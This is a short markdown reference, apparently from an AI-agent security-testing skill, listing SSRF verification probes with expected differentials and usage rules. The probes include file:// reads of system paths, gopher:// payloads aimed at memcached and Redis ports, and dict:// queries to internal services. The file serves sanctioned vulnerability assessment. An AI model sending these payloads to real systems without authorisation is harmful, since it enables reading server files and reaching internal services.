# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`ssrf-protocol-smuggling`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `ssrf-protocol-smuggling`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Local file read (file scheme)

**Expected differential:** a world-readable path returns file content via file:// while the http control returns the page

```text
url=file:///etc/hostname
url=file:///proc/self/status
```

### Raw TCP via gopher (controlled listener)

**Expected differential:** a gopher URL delivers crafted bytes to an assessor listener, proving arbitrary payload construction

```text
url=gopher://<assessor-controlled-host>:11211/_benign-probe
url=gopher://<assessor-controlled-host>:6379/_PING
```

### Service banner via dict

**Expected differential:** a dict query returns a banner from a service the http control cannot reach

```text
url=dict://<assessor-controlled-host>:11211/stats
url=dict://<internal-host>:6379/info
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
